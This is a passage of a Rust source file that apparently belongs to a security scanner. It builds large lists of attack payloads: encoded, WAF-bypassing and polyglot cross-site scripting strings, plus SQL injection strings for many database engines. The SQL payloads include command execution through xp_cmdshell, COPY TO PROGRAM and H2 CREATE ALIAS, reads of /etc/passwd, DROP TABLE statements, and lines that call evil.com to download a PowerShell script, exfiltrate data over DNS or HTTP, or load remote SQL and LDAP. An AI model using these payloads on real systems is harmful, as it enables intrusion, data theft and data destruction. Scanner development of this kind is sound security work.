        r#"<script>\x65\x76\x61\x6c('alert(1)')</script>"#.to_string(), // eval
        r#"<script>\x46\x75\x6e\x63\x74\x69\x6f\x6e('alert(1)')()</script>"#.to_string(), // Function

        // Partial hex encoding (mixed)
        r#"<script>al\x65rt(1)</script>"#.to_string(),
        r#"<script>\x61lert(1)</script>"#.to_string(),
        r#"<img src=x on\x65rror=alert(1)>"#.to_string(),
    ]);

    // ===========================================
    // 2. OCTAL ENCODING (\NNN format)
    // ===========================================

    // \141\154\145\162\164 = "alert"
    payloads.extend(vec![
        // Basic octal-encoded alert
        r#"<script>\141\154\145\162\164(1)</script>"#.to_string(),
        r#"<script>\141\154\145\162\164(document.domain)</script>"#.to_string(),

        // Octal in event handlers
        r#"<img src=x onerror=\141\154\145\162\164(1)>"#.to_string(),
        r#"<svg onload=\141\154\145\162\164(1)>"#.to_string(),

        // javascript: protocol in octal
        // \152\141\166\141\163\143\162\151\160\164 = "javascript"
        r#"<a href="\152\141\166\141\163\143\162\151\160\164:alert(1)">click</a>"#.to_string(),

        // Partial SVG tag in octal: \74\163\166\147 = "<svg"
        r#"javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76'"#.to_string(),

        // Mixed octal
        r#"<script>al\145rt(1)</script>"#.to_string(),
        r#"<script>\141lert(1)</script>"#.to_string(),
    ]);

    // ===========================================
    // 3. UNICODE ESCAPES (\uNNNN format)
    // ===========================================

    // \u0061\u006c\u0065\u0072\u0074 = "alert"
    payloads.extend(vec![
        // Basic Unicode-encoded alert
        r#"<script>\u0061\u006c\u0065\u0072\u0074(1)</script>"#.to_string(),
        r#"<script>\u0061\u006c\u0065\u0072\u0074(document.domain)</script>"#.to_string(),
        r#"<script>\u0061\u006c\u0065\u0072\u0074(document.cookie)</script>"#.to_string(),

        // Unicode in event handlers
        r#"<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>"#.to_string(),
        r#"<svg onload=\u0061\u006c\u0065\u0072\u0074(1)>"#.to_string(),
        r#"<body onload=\u0061\u006c\u0065\u0072\u0074(1)>"#.to_string(),

        // Full-width Unicode bypass characters
        // U+FF1C = < (full-width less-than)
        // U+FF1E = > (full-width greater-than)
        "<\u{FF1C}script\u{FF1E}alert(1)</script>".to_string(),
        "<img src=x onerror=\u{FF1C}alert(1)\u{FF1E}>".to_string(),

        // Unicode eval
        r#"<script>\u0065\u0076\u0061\u006c('alert(1)')</script>"#.to_string(),

        // Unicode Function constructor
        r#"<script>\u0046\u0075\u006e\u0063\u0074\u0069\u006f\u006e('alert(1)')()</script>"#.to_string(),

        // Partial Unicode encoding
        r#"<script>al\u0065rt(1)</script>"#.to_string(),
        r#"<script>\u0061lert(1)</script>"#.to_string(),
    ]);

    // ===========================================
    // 4. UTF-7 ENCODING (+ADw- format for legacy charset attacks)
    // ===========================================

    // +ADw- = < | +AD4- = > | +ACI- = "
    payloads.extend(vec![
        // Basic UTF-7 script tag
        "+ADw-script+AD4-alert(1)+ADw-/script+AD4-".to_string(),
        "+ADw-script+AD4-alert(document.domain)+ADw-/script+AD4-".to_string(),
        "+ADw-script+AD4-alert(document.cookie)+ADw-/script+AD4-".to_string(),

        // UTF-7 img tag with event handler
        "+ADw-img src+AD0-+ACI-1+ACI- onerror+AD0-+ACI-alert(1)+ACI- /+AD4-".to_string(),
        "+ADw-img src+AD0-x onerror+AD0-alert(1)+AD4-".to_string(),

        // UTF-7 SVG
        "+ADw-svg onload+AD0-alert(1)+AD4-".to_string(),
        "+ADw-svg/onload+AD0-alert(1)+AD4-".to_string(),

        // UTF-7 body tag
        "+ADw-body onload+AD0-alert(1)+AD4-".to_string(),

        // UTF-7 with charset header injection
        "+ADw-meta http-equiv+AD0-+ACI-Content-Type+ACI- content+AD0-+ACI-text/html+ADs- charset+AD0-UTF-7+ACI-+AD4-+ADw-script+AD4-alert(1)+ADw-/script+AD4-".to_string(),
    ]);

    // ===========================================
    // 5. UTF-8 OVERLONG SEQUENCES (WAF bypass)
    // ===========================================

    // These exploit UTF-8 encoding allowing multiple representations
    // < (U+003C) can be encoded as:
    // - 2-byte overlong: C0 BC
    // - 3-byte overlong: E0 80 BC
    // - 4-byte overlong: F0 80 80 BC
    payloads.extend(vec![
        // 2-byte overlong < (%C0%BC)
        "<%C0%BCscript>alert(1)</script>".to_string(),
        "<%C0%BCimg src=x onerror=alert(1)>".to_string(),
        "<%C0%BCsvg onload=alert(1)>".to_string(),

        // 3-byte overlong < (%E0%80%BC)
        "<%E0%80%BCscript>alert(1)</script>".to_string(),
        "<%E0%80%BCimg src=x onerror=alert(1)>".to_string(),
        "<%E0%80%BCsvg onload=alert(1)>".to_string(),

        // 4-byte overlong < (%F0%80%80%BC)
        "<%F0%80%80%BCscript>alert(1)</script>".to_string(),
        "<%F0%80%80%BCimg src=x onerror=alert(1)>".to_string(),

        // Mixed overlong sequences
        "<%C0%BCscript%C0%BEalert(1)<%C0%BC/script%C0%BE".to_string(),
        "<%E0%80%BCscript%E0%80%BEalert(1)<%E0%80%BC/script%E0%80%BE".to_string(),
    ]);

    // ===========================================
    // 6. MIXED/NESTED ENCODINGS
    // ===========================================

    payloads.extend(vec![
        // String.fromCharCode (97,108,101,114,116 = "alert")
        "eval(String.fromCharCode(97,108,101,114,116,40,49,41))".to_string(),
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>".to_string(),
        "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>".to_string(),

        // Double URL encoding
        "%253Cscript%253Ealert(1)%253C/script%253E".to_string(),
        "%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E".to_string(),
        "%253Csvg%2520onload%253Dalert(1)%253E".to_string(),

        // Triple URL encoding
        "%25253Cscript%25253Ealert(1)%25253C/script%25253E".to_string(),

        // Mixed hex + HTML entity
        r#"<script>\x61lert&#40;1&#41;</script>"#.to_string(),

        // Mixed Unicode + HTML entity
        r#"<script>\u0061lert&#40;1&#41;</script>"#.to_string(),

        // Base64 in data URI
        "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">click</a>".to_string(),
        "<iframe src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">".to_string(),

        // atob (base64 decode in JS)
        "<script>eval(atob('YWxlcnQoMSk='))</script>".to_string(),
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>".to_string(),

        // decodeURIComponent
        "<script>eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))</script>".to_string(),

        // Combined String.fromCharCode with hex
        r#"<script>eval(String['\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65'](97,108,101,114,116,40,49,41))</script>"#.to_string(),

        // Unicode escapes in property access
        r#"<script>window['\u0061\u006c\u0065\u0072\u0074'](1)</script>"#.to_string(),
        r#"<script>this['\u0061\u006c\u0065\u0072\u0074'](1)</script>"#.to_string(),
        r#"<script>self['\u0061\u006c\u0065\u0072\u0074'](1)</script>"#.to_string(),

        // Hex escapes in property access
        r#"<script>window['\x61\x6c\x65\x72\x74'](1)</script>"#.to_string(),
        r#"<script>this['\x61\x6c\x65\x72\x74'](1)</script>"#.to_string(),

        // JSFuck-style encoding (partial)
        "<script>[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]</script>".to_string(),
    ]);

    payloads
}

/// Generate advanced polyglot XSS payloads (15+)
/// Polyglots work across multiple contexts: HTML body, attribute, JS string, URL, template literals
pub fn generate_advanced_polyglot_xss() -> Vec<String> {
    vec![
        // ===========================================
        // 1. 0xsobky Ultimate Polyglot (JS, HTML event, SVG, URL)
        // Works in: script context, event handler, SVG, data URI
        // ===========================================
        r#"jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e"#.to_string(),

        // ===========================================
        // 2. Mathias Karlsson Polyglot (attribute/event/comment)
        // Breaks out of: attributes, event handlers, HTML comments
        // ===========================================
        r#"'-alert(1)-'"#.to_string(),
        r#"'-alert(1)//'"#.to_string(),
        r#"-->'"/><img src=x onerror=alert(1)//>"#.to_string(),

        // ===========================================
        // 3. Multi-context string polyglot (single/double quote JS strings)
        // Works in both single and double quoted strings
        // ===========================================
        r#"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"'>><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"#.to_string(),

        // ===========================================
        // 4. HTML/JS/URL polyglot
        // Works in: HTML context, JS context, URL context
        // ===========================================
        r#"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>"#.to_string(),
        r#"javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//"#.to_string(),

        // ===========================================
        // 5. Comment breakout polyglot
        // Breaks out of: HTML comments, JS comments, CSS comments
        // ===========================================
        r#"--!><svg/onload=alert()>"#.to_string(),
        r#"*/alert(1)/*"#.to_string(),
        r#"*/</script><script>alert(1)</script>/*"#.to_string(),
        r#"--></script><script>alert(1)</script><!--"#.to_string(),

        // ===========================================
        // 6. Template literal polyglot (ES6)
        // Works with backtick template strings
        // ===========================================
        r#"${alert(1)}"#.to_string(),
        r#"`-alert(1)-`"#.to_string(),
        r#"${`${alert(1)}`}"#.to_string(),
        r#"</script><script>`${alert(1)}`</script>"#.to_string(),

        // ===========================================
        // 7. Mutation XSS polyglot
        // Exploits browser HTML parsing quirks
        // ===========================================
        r#"<noscript><p title="</noscript><img src=x onerror=alert(1)>">"#.to_string(),
        r#"<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>"#.to_string(),
        r#"<svg><style>{font-family:'<img/src=x onerror=alert(1)>'}"#.to_string(),

        // ===========================================
        // 8. Universal context-breaker polyglot
        // Breaks out of most common contexts
        // ===========================================
        r#"</title></style></textarea></noscript></template></script><img src=x onerror=alert(1)>"#.to_string(),
        r#"'">--></style></script><script>alert(1)</script>"#.to_string(),

        // ===========================================
        // 9. Attribute value injection polyglot
        // Works in: href, src, data, action attributes
        // ===========================================
        r#"javascript:alert(1)//http://example.com"#.to_string(),
        r#"data:text/html,<script>alert(1)</script>"#.to_string(),

        // ===========================================
        // 10. Framework-specific polyglots
        // Angular, React, Vue template injection
        // ===========================================
        r#"{{constructor.constructor('alert(1)')()}}"#.to_string(),  // Angular
        r#"{{$on.constructor('alert(1)')()}}"#.to_string(),           // Angular
        r#"[constructor.constructor('alert(1)')()]"#.to_string(),     // Vue
        r#"<img src=x ng-on-error=alert(1)>"#.to_string(),           // AngularJS
    ]
}

/// Get all XSS payloads (110,000+ total)
pub fn get_all_xss_payloads() -> Vec<String> {
    let mut all_payloads = Vec::new();

    all_payloads.extend(generate_script_variations()); // 20,000+
    all_payloads.extend(generate_event_variations()); // 40,000+
    all_payloads.extend(generate_encoding_variations()); // 20,000+
    all_payloads.extend(generate_waf_bypass()); // 10,000+
    all_payloads.extend(generate_protocol_variations()); // 5,000+
    all_payloads.extend(generate_dom_variations()); // 5,000+
    all_payloads.extend(generate_polyglot_xss()); // 100+
    all_payloads.extend(generate_svg_xss()); // 200+
    all_payloads.extend(generate_mutation_xss()); // 100+
    all_payloads.extend(generate_context_aware_xss()); // 300+
    all_payloads.extend(generate_modern_waf_bypass_xss()); // 200+
    all_payloads.extend(generate_modern_xss_2024_2025()); // 10,000+
    all_payloads.extend(generate_advanced_encoding_bypass_xss()); // 50+ encoding bypass (hex, octal, Unicode, UTF-7)
    all_payloads.extend(generate_advanced_polyglot_xss()); // 22+ advanced polyglots (multi-context)

    all_payloads
}

/// Generate second-order SQLi payloads (200+)
/// These payloads are stored in the database and executed later
pub fn generate_second_order_sqli() -> Vec<String> {
    let mut payloads = Vec::new();

    // Username/registration fields for second-order
    payloads.extend(vec![
        "admin'--".to_string(),
        "admin' OR '1'='1".to_string(),
        "admin' UNION SELECT NULL--".to_string(),
        "'; DROP TABLE users--".to_string(),
        "'; UPDATE users SET role='admin'--".to_string(),
        "'; INSERT INTO admins VALUES('hacker','pass')--".to_string(),
    ]);

    // Comment fields for second-order
    payloads.extend(vec![
        "Test' OR '1'='1".to_string(),
        "Test'; DROP TABLE comments--".to_string(),
        "Test' UNION SELECT username,password FROM users--".to_string(),
    ]);

    // Profile bio/description fields
    payloads.extend(vec![
        "My bio' OR 1=1--".to_string(),
        "Description'; EXEC xp_cmdshell('whoami')--".to_string(),
        "About me'; SELECT load_file('/etc/passwd')--".to_string(),
    ]);

    // Email fields
    payloads.extend(vec![
        "user@test.com' OR '1'='1".to_string(),
        "admin@test.com'--".to_string(),
        "test@example.com'; DROP TABLE emails--".to_string(),
    ]);

    // Product/item names
    payloads.extend(vec![
        "Product' OR 1=1--".to_string(),
        "Item'; UPDATE products SET price=0--".to_string(),
        "Test' UNION SELECT NULL,NULL,NULL--".to_string(),
    ]);

    // Search queries stored in history
    payloads.extend(vec![
        "search' OR '1'='1".to_string(),
        "test'; DELETE FROM search_history--".to_string(),
    ]);

    // File names
    payloads.extend(vec![
        "file.txt'; DELETE FROM files--".to_string(),
        "document.pdf' OR 1=1--".to_string(),
    ]);

    // Address fields
    payloads.extend(vec![
        "123 Main St' OR '1'='1".to_string(),
        "Address'; UPDATE addresses SET verified=1--".to_string(),
    ]);

    payloads
}

/// Generate MySQL-specific advanced SQLi (300+)
pub fn generate_mysql_specific_sqli() -> Vec<String> {
    let mut payloads = Vec::new();

    // MySQL information extraction
    payloads.extend(vec![
        "' UNION SELECT NULL,version()--".to_string(),
        "' UNION SELECT NULL,database()--".to_string(),
        "' UNION SELECT NULL,user()--".to_string(),
        "' UNION SELECT NULL,@@datadir--".to_string(),
        "' UNION SELECT NULL,@@version_compile_os--".to_string(),
        "' UNION SELECT NULL,@@hostname--".to_string(),
    ]);

    // MySQL file operations
    payloads.extend(vec![
        "' UNION SELECT NULL,load_file('/etc/passwd')--".to_string(),
        "' UNION SELECT NULL,load_file('C:\\\\windows\\\\win.ini')--".to_string(),
        "' INTO OUTFILE '/tmp/output.txt'--".to_string(),
        "' INTO DUMPFILE '/tmp/shell.php'--".to_string(),
    ]);

    // MySQL stacking queries
    payloads.extend(vec![
        "'; SELECT SLEEP(5)--".to_string(),
        "'; SELECT IF(1=1,SLEEP(5),0)--".to_string(),
        "'; SET @sql=CONCAT('SELECT * FROM users'); PREPARE stmt FROM @sql; EXECUTE stmt--"
            .to_string(),
    ]);

    // MySQL substring extraction (blind)
    payloads.extend(vec![
        "' AND SUBSTRING(version(),1,1)='5'--".to_string(),
        "' AND ASCII(SUBSTRING(database(),1,1))>97--".to_string(),
        "' AND LENGTH(database())>5--".to_string(),
    ]);

    // MySQL conditional errors
    payloads.extend(vec![
        "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--".to_string(),
        "' AND extractvalue(1,concat(0x7e,version()))--".to_string(),
        "' AND updatexml(1,concat(0x7e,database()),1)--".to_string(),
    ]);

    payloads
}

/// Generate PostgreSQL-specific advanced SQLi (300+)
pub fn generate_postgresql_specific_sqli() -> Vec<String> {
    let mut payloads = Vec::new();

    // PostgreSQL information extraction
    payloads.extend(vec![
        "' UNION SELECT NULL,version()--".to_string(),
        "' UNION SELECT NULL,current_database()--".to_string(),
        "' UNION SELECT NULL,current_user--".to_string(),
        "' UNION SELECT NULL,inet_server_addr()--".to_string(),
        "' UNION SELECT NULL,inet_server_port()::text--".to_string(),
    ]);

    // PostgreSQL file operations
    payloads.extend(vec![
        "'; COPY (SELECT '') TO PROGRAM 'whoami'--".to_string(),
        "'; CREATE TABLE cmd_exec(cmd_output text)--".to_string(),
        "'; COPY cmd_exec FROM PROGRAM 'id'--".to_string(),
    ]);

    // PostgreSQL large objects
    payloads.extend(vec![
        "' UNION SELECT NULL,lo_import('/etc/passwd')::text--".to_string(),
        "' UNION SELECT NULL,lo_get(12345)--".to_string(),
    ]);

    // PostgreSQL stacking queries
    payloads.extend(vec![
        "'; SELECT pg_sleep(5)--".to_string(),
        "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--".to_string(),
        "'; DROP TABLE users CASCADE--".to_string(),
    ]);

    // PostgreSQL conditional extraction
    payloads.extend(vec![
        "' AND SUBSTRING(version(),1,10)='PostgreSQL'--".to_string(),
        "' AND ASCII(SUBSTRING(current_database(),1,1))>97--".to_string(),
        "' AND LENGTH(current_user)>5--".to_string(),
    ]);

    // PostgreSQL XML functions
    payloads.extend(vec![
        "' UNION SELECT NULL,xmlelement(name foo,version())::text--".to_string(),
        "' UNION SELECT NULL,query_to_xml('SELECT * FROM users',true,true,'')::text--".to_string(),
    ]);

    payloads
}

/// Generate MSSQL-specific advanced SQLi (300+)
pub fn generate_mssql_specific_sqli() -> Vec<String> {
    let mut payloads = Vec::new();

    // MSSQL information extraction
    payloads.extend(vec![
        "' UNION SELECT NULL,@@version--".to_string(),
        "' UNION SELECT NULL,DB_NAME()--".to_string(),
        "' UNION SELECT NULL,SYSTEM_USER--".to_string(),
        "' UNION SELECT NULL,@@SERVERNAME--".to_string(),
        "' UNION SELECT NULL,SUSER_SNAME()--".to_string(),
    ]);

    // MSSQL command execution
    payloads.extend(vec![
        "'; EXEC xp_cmdshell 'whoami'--".to_string(),
        "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE--".to_string(),
        "'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--".to_string(),
        "'; EXEC xp_cmdshell 'powershell IEX(New-Object Net.WebClient).downloadString(\"http://evil.com/shell.ps1\")'--".to_string(),
    ]);

    // MSSQL file operations
    payloads.extend(vec![
        "'; EXEC xp_dirtree 'C:\\'--".to_string(),
        "'; EXEC xp_fileexist 'C:\\windows\\system32\\cmd.exe'--".to_string(),
        "' UNION SELECT NULL,BULK 'C:\\windows\\win.ini',SINGLE_CLOB--".to_string(),
    ]);

    // MSSQL stacking queries
    payloads.extend(vec![
        "'; WAITFOR DELAY '00:00:05'--".to_string(),
        "'; IF (1=1) WAITFOR DELAY '00:00:05'--".to_string(),
        "'; DECLARE @x VARCHAR(8000);SET @x=':';EXEC(@x)--".to_string(),
    ]);

    // MSSQL error-based
    payloads.extend(vec![
        "' AND 1=CONVERT(INT,@@version)--".to_string(),
        "' AND 1=CAST(DB_NAME() AS INT)--".to_string(),
        "' UNION SELECT 1/0--".to_string(),
    ]);

    // MSSQL linked servers
    payloads.extend(vec![
        "'; EXEC sp_linkedservers--".to_string(),
        "'; SELECT * FROM OPENROWSET('SQLOLEDB','Server=192.168.1.1;uid=sa;pwd=pass','SELECT 1')--"
            .to_string(),
    ]);

    payloads
}

/// Generate Oracle-specific advanced SQLi (300+)
pub fn generate_oracle_specific_sqli() -> Vec<String> {
    let mut payloads = Vec::new();

    // Oracle information extraction
    payloads.extend(vec![
        "' UNION SELECT NULL,banner FROM v$version--".to_string(),
        "' UNION SELECT NULL,version FROM v$instance--".to_string(),
        "' UNION SELECT NULL,user FROM dual--".to_string(),
        "' UNION SELECT NULL,SYS_CONTEXT('USERENV','SESSION_USER') FROM dual--".to_string(),
        "' UNION SELECT NULL,instance_name FROM v$instance--".to_string(),
    ]);

    // Oracle time-based blind
    payloads.extend(vec![
        "' AND DBMS_LOCK.SLEEP(5)--".to_string(),
        "' AND (SELECT COUNT(*) FROM ALL_USERS t1,ALL_USERS t2,ALL_USERS t3,ALL_USERS t4,ALL_USERS t5)>0--".to_string(),
    ]);

    // Oracle error-based
    payloads.extend(vec![
        "' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))--".to_string(),
        "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--".to_string(),
        "' AND 1=XMLType((SELECT user FROM dual))--".to_string(),
    ]);

    // Oracle DNS exfiltration
    payloads.extend(vec![
        "' UNION SELECT NULL,UTL_INADDR.GET_HOST_ADDRESS('evil.com')FROM dual--".to_string(),
        "' UNION SELECT NULL,UTL_HTTP.REQUEST('http://evil.com/'||user)FROM dual--".to_string(),
    ]);

    // Oracle command execution (Java procedures)
    payloads.extend(vec![
        "'; DECLARE cmd VARCHAR2(4000);BEGIN cmd:='whoami';DBMS_JAVA.SET_OUTPUT(10000);END;--"
            .to_string(),
    ]);

    // Oracle file operations
    payloads.extend(vec![
        "' UNION SELECT NULL,UTL_FILE.GET_LINE('/etc/passwd',1)FROM dual--".to_string(),
    ]);

    payloads
}

/// H2 Database specific SQLi payloads (15+ payloads)
/// Targets: H2 embedded database (Java), CREATE ALIAS RCE, CSVREAD file read, LINK_SCHEMA JNDI
pub fn generate_h2_specific_sqli() -> Vec<String> {
    let mut payloads = Vec::new();

    // H2 version detection
    payloads.extend(vec![
        "' UNION SELECT NULL,H2VERSION()--".to_string(),
        "' UNION SELECT NULL,DATABASE()--".to_string(),
        "' AND 1=(SELECT H2VERSION())--".to_string(),
    ]);

    // H2 CREATE ALIAS Remote Code Execution
    payloads.extend(vec![
        "'; CREATE ALIAS EXEC AS 'void exec(String cmd) throws java.io.IOException{Runtime.getRuntime().exec(cmd);}'--".to_string(),
        "'; CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws Exception{Runtime rt=Runtime.getRuntime();Process p=rt.exec(cmd);return new java.util.Scanner(p.getInputStream()).useDelimiter(\"\\\\A\").next();}$$--".to_string(),
        "'; CREATE ALIAS IF NOT EXISTS EXEC AS 'void exec(String c)throws Exception{Runtime.getRuntime().exec(c);}'--".to_string(),
        "'; CALL EXEC('whoami')--".to_string(),
    ]);

    // H2 CSVREAD file read exploitation
    payloads.extend(vec![
        "' UNION SELECT * FROM CSVREAD('file:///etc/passwd')--".to_string(),
        "' UNION SELECT * FROM CSVREAD('/etc/passwd')--".to_string(),
        "' UNION SELECT NULL,C1 FROM CSVREAD('file:///etc/passwd')--".to_string(),
        "' UNION SELECT * FROM CSVREAD('C:\\Windows\\win.ini')--".to_string(),
    ]);

    // H2 LINK_SCHEMA JNDI injection (CVE-2021-42392 style)
    payloads.extend(vec![
        "'; CREATE TABLE test AS SELECT * FROM LINK_SCHEMA('attackerdb','org.h2.Driver','jdbc:h2:mem:','sa','')--".to_string(),
        "'; CREATE LINKED TABLE link(ID INT) DRIVER 'javax.naming.InitialContext' URL 'ldap://evil.com/a'--".to_string(),
        "'; RUNSCRIPT FROM 'http://evil.com/exploit.sql'--".to_string(),
    ]);

    // H2 error-based extraction
    payloads.extend(vec![
        "' AND 1=CAST(USER() AS INT)--".to_string(),
        "' AND 1=CONVERT(DATABASE(),INT)--".to_string(),
    ]);

    // H2 time-based blind
    payloads.extend(vec![
        "'; CALL SLEEP(5)--".to_string(),
        "' AND 1=(SELECT SLEEP(5))--".to_string(),
    ]);

    // H2 system information
    payloads.extend(vec![
        "' UNION SELECT NULL,SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA--".to_string(),
        "' UNION SELECT NULL,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES--".to_string(),
        "' UNION SELECT NULL,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS--".to_string(),
    ]);

    payloads
}

/// MariaDB specific SQLi payloads (20+ payloads)
/// Targets: MariaDB-specific functions, CONNECT engine, version detection, system tables
pub fn generate_mariadb_specific_sqli() -> Vec<String> {
    let mut payloads = Vec::new();

    // MariaDB version detection (distinguishing from MySQL)
    payloads.extend(vec![
        "' UNION SELECT NULL,@@version--".to_string(),
        "' UNION SELECT NULL,VERSION()--".to_string(),
        "' AND VERSION() LIKE '%MariaDB%'--".to_string(),
        "' AND @@version_comment LIKE '%mariadb%'--".to_string(),
        "' UNION SELECT NULL,@@version_comment--".to_string(),
    ]);

    // MariaDB-specific functions
    payloads.extend(vec![
        "' UNION SELECT NULL,COLUMN_JSON((SELECT * FROM information_schema.tables LIMIT 1))--".to_string(),
        "' UNION SELECT NULL,JSON_DETAILED((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables))--".to_string(),
        "' UNION SELECT NULL,JSON_QUERY('{}','$')--".to_string(),
        "' AND JSON_VALID('{}')--".to_string(),
    ]);

    // MariaDB CONNECT storage engine exploitation
    payloads.extend(vec![
        "'; CREATE TABLE exploit ENGINE=CONNECT TABLE_TYPE=DOS FILE_NAME='/etc/passwd'--".to_string(),
        "'; CREATE TABLE remote ENGINE=CONNECT TABLE_TYPE=MYSQL SRCDEF='SELECT * FROM mysql.user' HOST='localhost'--".to_string(),
        "'; CREATE TABLE csvfile ENGINE=CONNECT TABLE_TYPE=CSV FILE_NAME='/var/log/auth.log'--".to_string(),
        "'; CREATE TABLE xml_data ENGINE=CONNECT TABLE_TYPE=XML FILE_NAME='http://evil.com/xxe.xml'--".to_string(),
    ]);

    // MariaDB version-conditional execution
    payloads.extend(vec![
        "' /*!50503UNION*//*!50503SELECT*/NULL,user()--".to_string(),
        "' /*!100000AND*/1=1--".to_string(),
        "' /*!100508UNION SELECT*/NULL,@@version--".to_string(),
    ]);

    // MariaDB system tables and information
    payloads.extend(vec![
        "' UNION SELECT NULL,Host FROM mysql.user--".to_string(),
        "' UNION SELECT NULL,authentication_string FROM mysql.user--".to_string(),
        "' UNION SELECT NULL,plugin FROM mysql.user WHERE user='root'--".to_string(),
        "' UNION SELECT NULL,variable_value FROM information_schema.global_variables WHERE variable_name='secure_file_priv'--".to_string(),
    ]);

    // MariaDB time-based blind
    payloads.extend(vec![
        "' AND SLEEP(5)--".to_string(),
        "' AND BENCHMARK(10000000,SHA1('test'))--".to_string(),
        "' AND (SELECT * FROM (SELECT SLEEP(5))a)--".to_string(),
    ]);

    // MariaDB error-based
    payloads.extend(vec![
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--".to_string(),
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--".to_string(),
        "' AND ROW(1,1)>(SELECT COUNT(*),CONCAT((SELECT user()),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)--".to_string(),
    ]);

    // MariaDB stored procedure injection
    payloads.extend(vec![
        "'; CALL mysql.rds_kill(1)--".to_string(),
        "'; SET @q='SELECT * FROM users'; PREPARE stmt FROM @q; EXECUTE stmt--".to_string(),
    ]);

    payloads
}

/// CockroachDB specific SQLi payloads (15+ payloads)
/// Targets: CockroachDB crdb_internal tables, PostgreSQL-compatible, EXPLAIN, version detection
pub fn generate_cockroachdb_specific_sqli() -> Vec<String> {
    let mut payloads = Vec::new();

    // CockroachDB version detection
    payloads.extend(vec![
        "' UNION SELECT NULL,version()--".to_string(),
        "' UNION SELECT NULL,crdb_internal.node_build_info()--".to_string(),
        "' AND version() LIKE '%CockroachDB%'--".to_string(),
        "' UNION SELECT NULL,current_setting('server_version')--".to_string(),
    ]);

    // CockroachDB crdb_internal system tables
    payloads.extend(vec![
        "' UNION SELECT NULL,node_id FROM crdb_internal.gossip_nodes--".to_string(),
        "' UNION SELECT NULL,store_id FROM crdb_internal.kv_store_status--".to_string(),
        "' UNION SELECT NULL,database_name FROM crdb_internal.databases--".to_string(),
        "' UNION SELECT NULL,table_name FROM crdb_internal.tables--".to_string(),
        "' UNION SELECT NULL,descriptor FROM crdb_internal.table_columns--".to_string(),
        "' UNION SELECT NULL,address FROM crdb_internal.gossip_liveness--".to_string(),
    ]);

    // CockroachDB-specific functions
    payloads.extend(vec![
        "' UNION SELECT NULL,crdb_internal.cluster_id()--".to_string(),
        "' UNION SELECT NULL,crdb_internal.node_id()--".to_string(),
        "' UNION SELECT NULL,crdb_internal.pretty_key(b'\\x00',0)--".to_string(),
    ]);

    // CockroachDB EXPLAIN information disclosure
    payloads.extend(vec![
        "'; EXPLAIN SELECT * FROM users--".to_string(),
        "'; EXPLAIN ANALYZE SELECT * FROM sensitive_data--".to_string(),
        "'; SHOW COLUMNS FROM users--".to_string(),
        "'; SHOW CREATE TABLE users--".to_string(),
    ]);

    // CockroachDB PostgreSQL-compatible injection (CockroachDB is PG-wire compatible)
    payloads.extend(vec![
        "' UNION SELECT NULL,usename FROM pg_user--".to_string(),
        "' UNION SELECT NULL,datname FROM pg_database--".to_string(),
        "' AND pg_sleep(5)--".to_string(),
        "' UNION SELECT NULL,current_user()--".to_string(),
    ]);

    // CockroachDB error-based extraction
    payloads.extend(vec![
        "' AND 1=CAST(version() AS INT)--".to_string(),
        "' AND 1=CAST(current_user() AS INT)--".to_string(),
    ]);

    payloads
}

/// Sybase specific SQLi payloads (20+ payloads)
/// Targets: Sybase ASE system tables, xp_cmdshell, WAITFOR, error-based extraction
pub fn generate_sybase_specific_sqli() -> Vec<String> {
    let mut payloads = Vec::new();

    // Sybase version detection
    payloads.extend(vec![
        "' UNION SELECT NULL,@@version--".to_string(),
        "' UNION SELECT NULL,@@servername--".to_string(),
        "' AND @@version LIKE '%Sybase%'--".to_string(),
        "' UNION SELECT NULL,@@language--".to_string(),
    ]);

    // Sybase system tables (master database)
    payloads.extend(vec![
        "' UNION SELECT NULL,name FROM master..sysdatabases--".to_string(),
        "' UNION SELECT NULL,name FROM master..sysobjects WHERE type='U'--".to_string(),
        "' UNION SELECT NULL,name FROM master..syscolumns--".to_string(),
        "' UNION SELECT NULL,name FROM master..syslogins--".to_string(),
        "' UNION SELECT NULL,password FROM master..syslogins--".to_string(),
    ]);

    // Sybase command execution (xp_cmdshell)
    payloads.extend(vec![
